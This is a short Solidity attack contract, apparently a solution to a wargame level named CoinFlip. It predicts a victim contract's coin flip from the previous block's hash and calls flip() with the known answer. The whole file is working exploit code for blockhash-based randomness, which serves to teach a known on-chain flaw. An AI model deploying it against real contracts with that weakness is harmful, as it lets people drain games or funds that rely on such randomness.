/*
    This is the attack contract, and you gonna use this for the hack, all we need is the contract address of our victim contract, i.e CoinFlip's address
*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.0;

// First create the interface of what our attacking contract looks like, tho you can also skip this step but need to import the contract file in this smart contract..
// Anyways, creating the interface seems kind of professional!!
interface ICoinFlip{
    // this consecutiveWins() function is kind of optional, it is here just for checking the wins, better to just remove it if seeking less gas
    function consecutiveWins() external view returns (uint);
    function flip(bool) external returns (bool);
}

contract Attacker{
    // Create state variables to represent CoinFlip contract + FACTOR
    ICoinFlip public coinflip;
    uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // Init the target CoinFlip address..

    // We are not using "new" before CoinFlip because we want to
    // interact with the existing contract, not any new instance of it
    constructor(address _victimContract){
        coinflip = ICoinFlip(_victimContract);
    }

    // our attacking function which is using the flip functionality
    function attack() external {
        // Get blockhash of previous block, then convert to integer uint
        uint blockValue = uint(blockhash(block.number - 1));
        // Take blockvalue and divide it by the 'FACTOR' from the original contract
        uint coinFlip = uint(blockValue / FACTOR);
        // value is true if coinFlip value == 1 otherwise false
        bool side = coinFlip == 1 ? true : false;

        // call flip and pass our guess!
        coinflip.flip(side);
    }

    function consecutiveWins() external view returns (uint){
        return coinflip.consecutiveWins();
    }

}